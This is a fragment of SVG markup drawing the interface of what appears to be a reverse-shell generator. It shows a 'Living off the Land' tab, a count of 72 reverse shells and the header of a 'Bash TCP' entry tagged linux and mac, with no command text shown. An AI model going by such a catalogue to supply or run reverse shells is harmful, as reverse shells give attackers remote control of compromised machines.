  <text x="567" y="237" text-anchor="middle" font-size="9" fill="#555">► Living off the Land</text>

  <!-- Tab content area -->
  <rect x="12" y="244" width="796" height="222" rx="0 4 4 4" fill="#0d1a0d" stroke="#1a5a1a" stroke-width="1"/>

  <!-- Shell count -->
  <text x="24" y="262" font-size="9" fill="#444" letter-spacing="1">Showing <tspan fill="#00cc00">72</tspan> reverse shells</text>

  <!-- Shell item 1 — Bash TCP (open) -->
  <rect x="22" y="270" width="780" height="86" rx="3" fill="#060f06" stroke="#2a5a2a" stroke-width="1"/>
  <rect x="22" y="270" width="780" height="28" rx="3 3 0 0" fill="#060f06"/>
  <text x="34" y="288" font-size="10" fill="#00cc00" font-weight="bold">Bash TCP</text>
  <!-- badges -->
  <rect x="108" y="278" width="36" height="14" rx="2" fill="#1a1600" stroke="#5a4a10" stroke-width="1"/>
  <text x="126" y="289" text-anchor="middle" font-size="8" fill="#f0c060">linux</text>
  <rect x="150" y="278" width="32" height="14" rx="2" fill="#001620" stroke="#105a70" stroke-width="1"/>
  <text x="166" y="289" text-anchor="middle" font-size="8" fill="#60c0f0">mac</text>
